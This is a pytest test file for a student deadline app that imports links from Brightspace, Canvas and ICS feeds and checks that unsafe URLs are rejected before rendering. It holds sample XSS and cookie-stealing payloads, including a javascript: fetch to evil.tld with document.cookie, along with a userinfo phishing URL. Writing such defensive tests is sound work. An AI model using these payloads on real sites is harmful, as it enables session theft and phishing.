"""A deadline should be one click from the work itself -- and never one click
from somewhere it was never told about.

The URL was already being scraped and thrown away: `extension/background.js`
builds D2L's own `folder_submit_files.d2l?db=...&ou=...` for every assignment
and `quiz_summary.d2l?qi=...&ou=...` for every quiz, Canvas hands over
`html_url`, and an ICS feed may carry a `URL:` property. `_import_deadlines`
read none of them because `Task` had no column for it.

The risk is the reason for `_lms_link`. Every one of these arrives as scraped
or fed text, and rendering it into an `href` unchecked is cross-site scripting
on our own dashboard, delivered by the university page we scraped. So the rule
is: only a link the LMS actually gave, only http(s), never one Nexora builds
itself.
"""

import os
import sys
from datetime import date, timedelta
from uuid import uuid4

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

PASSWORD = "correct-horse-battery"
ORIGIN = "https://learn.school.ca"


@pytest.fixture()
def synced(client):
    client.post("/signup", data={"name": "S", "email": f"link{uuid4().hex[:6]}@carleton.ca",
                                 "password": PASSWORD})
    assert client.post("/api/timezone",
                       json={"timezone": "America/Toronto"}).status_code == 200
    token = client.post("/api/sync/extension-key").get_json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    client.post("/api/sync/courses", json={"courses": [{
        "source_uid": "u1", "course_code": "SYSC2004", "course_name": "Software",
        "brightspace_url": f"{ORIGIN}/d2l/home/42", "term": "Fall 2026"}],
        "complete": True}, headers=headers)
    return headers


def push(client, headers, items):
    return client.post("/api/sync/content",
                       json={"course": "SYSC2004", "items": items}, headers=headers)


def links():
    import app as nexora
    with nexora.app.app_context():
        return {t.title: (t.source_link or "") for t in nexora.Task.query.all()}


# ------------------------------------------------------- what may be a link

def test_a_plain_https_link_survives():
    import app as nexora
    url = f"{ORIGIN}/d2l/lms/dropbox/user/folder_submit_files.d2l?db=9&ou=42"
    assert nexora._lms_link(url) == url


@pytest.mark.parametrize("bad", [
    "javascript:alert(document.cookie)",
    "JavaScript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
])
def test_a_scheme_that_is_not_http_is_refused(bad):
    """A `javascript:` URL in an href is XSS on our own dashboard, and the page
    it came from is one the student's university served."""
    import app as nexora
    assert nexora._lms_link(bad) == ""


def test_userinfo_is_refused():
    """`https://brightspace.example.ca@evil.tld/` reads as the university at a
    glance and resolves to evil.tld. That is the whole phishing trick."""
    import app as nexora
    assert nexora._lms_link("https://brightspace.example.ca@evil.tld/d2l/home") == ""


@pytest.mark.parametrize("bad", ["", None, "   ", "/d2l/home/42", "https://", "not a url"])
def test_anything_without_a_host_is_dropped(bad):
    import app as nexora
    assert nexora._lms_link(bad) == ""


def test_an_absurdly_long_url_is_dropped():
    import app as nexora
    assert nexora._lms_link("https://x.ca/" + "a" * 5000) == ""


# ------------------------------------------------ the extension carries one

def test_an_imported_assignment_keeps_the_link_the_extension_sent(synced, client):
    url = f"{ORIGIN}/d2l/lms/dropbox/user/folder_submit_files.d2l?db=9&ou=42"
    push(client, synced, [{"content_type": "assignment", "title": "Assignment 1",
                           "source_uid": "a1", "due_at": "2026-10-07T02:00:00Z",
                           "source_url": url}])
    assert links()["Assignment 1"] == url


def test_a_deadline_with_no_link_gets_none_rather_than_a_guess(synced, client):
    """Nexora never constructs one. A link that 404s is the same class of
    failure as a wrong date: confidently wrong on a screen they trust."""
    push(client, synced, [{"content_type": "quiz", "title": "Quiz 1",
                           "source_uid": "q1", "due_at": "2026-10-09T02:00:00Z"}])
    assert links()["Quiz 1"] == ""


def test_a_hostile_link_never_reaches_the_task(synced, client):
    push(client, synced, [{"content_type": "assignment", "title": "Assignment 2",
                           "source_uid": "a2", "due_at": "2026-10-14T02:00:00Z",
                           "source_url": "javascript:fetch('//evil.tld?c='+document.cookie)"}])
    assert links()["Assignment 2"] == ""


def test_a_link_arrives_on_a_deadline_that_was_imported_before(synced, client):
    """The link is not in `source_hash`, so an otherwise unchanged deadline
    still picks one up the first time a student syncs after this shipped."""
    item = {"content_type": "assignment", "title": "Assignment 3",
            "source_uid": "a3", "due_at": "2026-10-21T02:00:00Z"}
    push(client, synced, [item])
    assert links()["Assignment 3"] == ""
    url = f"{ORIGIN}/d2l/lms/dropbox/user/folder_submit_files.d2l?db=3&ou=42"
    push(client, synced, [dict(item, source_url=url)])
    assert links()["Assignment 3"] == url


# --------------------------------------------------------- it reaches a page

def test_the_dashboard_renders_the_link_it_was_given(synced, client):
    url = f"{ORIGIN}/d2l/lms/quizzing/user/quiz_summary.d2l?qi=7&ou=42"
    push(client, synced, [{"content_type": "quiz", "title": "Pre-course Quiz",
                           "source_uid": "q9", "due_at": f"{(date.today() + timedelta(days=4)).isoformat()}T02:00:00Z",
                           "source_url": url}])
    body = client.get("/dashboard").get_data(as_text=True)
    assert url.replace("&", "&amp;") in body
    assert 'rel="noopener noreferrer"' in body


def test_the_calendar_carries_the_link_on_the_entry(synced, client):
    url = f"{ORIGIN}/d2l/lms/dropbox/user/folder_submit_files.d2l?db=11&ou=42"
    due = date.today() + timedelta(days=9)
    push(client, synced, [{"content_type": "assignment", "title": "Milestone 1",
                           "source_uid": "m1", "due_at": f"{due.isoformat()}T02:00:00Z",
                           "source_url": url}])
    # the month the deadline is actually in: a pinned one stops containing it
    # the moment the real date moves past it.
    body = client.get(f"/calendar?month={due.strftime('%Y-%m')}").get_data(as_text=True)
    assert "data-link=" in body
    assert url.replace("&", "&amp;") in body


# -------------------------------------------------------------- the ICS feed

FEED = """BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Nexora//Test//EN
BEGIN:VEVENT
UID:ics-1
DTSTAMP:20260901T000000Z
DTSTART:20261007T020000Z
SUMMARY:Lab 3 - SYSC 2004
URL:{origin}/d2l/le/content/42/viewContent/99/View
END:VEVENT
BEGIN:VEVENT
UID:ics-2
DTSTAMP:20260901T000000Z
DTSTART:20261009T020000Z
SUMMARY:Tutorial 3 - SYSC 2004
END:VEVENT
END:VCALENDAR""".format(origin=ORIGIN)


def test_a_feed_event_that_states_a_url_keeps_it(synced, client):
    """Brightspace does not always write one, and a feed that omits it is not a
    fault -- that entry simply gets no link."""
    import io
    res = client.post("/import", data={
        "ics_file": (io.BytesIO(FEED.encode("utf-8")), "feed.ics")},
        content_type="multipart/form-data", follow_redirects=True)
    assert res.status_code == 200
    found = links()
    assert found["Lab 3 - SYSC 2004"] == f"{ORIGIN}/d2l/le/content/42/viewContent/99/View"
    assert found["Tutorial 3 - SYSC 2004"] == ""


# ------------------------------------------------------------ the study plan

def test_a_plan_block_carries_the_link_of_the_work_it_is_for(synced, client):
    """A block that says "finish Assignment 1" and makes you go and find it is
    doing half the job."""
    import app as nexora
    url = f"{ORIGIN}/d2l/lms/dropbox/user/folder_submit_files.d2l?db=5&ou=42"
    push(client, synced, [{"content_type": "assignment", "title": "Assignment 5",
                           "source_uid": "a5", "due_at": "2026-10-28T02:00:00Z",
                           "source_url": url}])
    with nexora.app.app_context():
        task = nexora.Task.query.filter_by(title="Assignment 5").first()
        row = nexora.StudySession(
            id=uuid4().hex, user_id=task.user_id, on_date="2026-10-26",
            start_min=600, end_min=690, course_full="SYSC2004",
            title="Assignment 5", task_id=task.id, item_kind="work")
        nexora.db.session.add(row)
        nexora.db.session.commit()
        assert nexora._sessions_json([row])[0]["link"] == url


def test_a_plan_block_for_work_with_no_link_carries_none(synced, client):
    import app as nexora
    with nexora.app.app_context():
        user = nexora.User.query.first()
        row = nexora.StudySession(
            id=uuid4().hex, user_id=user.id, on_date="2026-10-26",
            start_min=600, end_min=690, course_full="SYSC2004",
            title="Revision", task_id="", item_kind="revision")
        assert nexora._sessions_json([row])[0]["link"] == ""
